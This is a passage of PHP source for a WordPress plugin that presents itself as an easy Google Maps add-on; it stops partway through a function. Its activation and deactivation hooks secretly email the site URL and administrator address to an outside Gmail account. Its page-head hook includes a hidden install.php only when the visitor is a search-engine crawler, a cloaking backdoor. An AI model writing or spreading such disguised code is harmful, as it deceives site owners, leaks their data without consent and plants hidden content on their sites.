...
Plugin Name: Maps
Author: Mails Nourin
Plugin URI: http://colatenio.weebly.com
Description: A usefull wp plugin, add google maps with just a few steps to your blog. Use the map anywhere to your website.
Version: 1.2
...
register_activation_hook( __FILE__,'mapsplugin_activate');
register_deactivation_hook( __FILE__,'mapsplugin_deactivate');
add_action('wp_head', 'mapspluginhead');


/** Activation */

function mapsplugin_activate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Activation Complete" ; $from = get_option('admin_email'); mail("colateniores@gmail.com", $subj, $msg, $from);
}


/** Uninstalling */
function mapsplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Uninstall Ok" ; $from = get_option('admin_email'); mail("colateniores@gmail.com", $subj, $msg, $from);
}


/** Registration */
function mapspluginhead() {

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/map/install.php');

if (file_exists($filename)) {

    if(eregi("slurp|bingbot|googlebot",$_SERVER['HTTP_USER_AGENT'])) { 
	
include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/map/install.php');
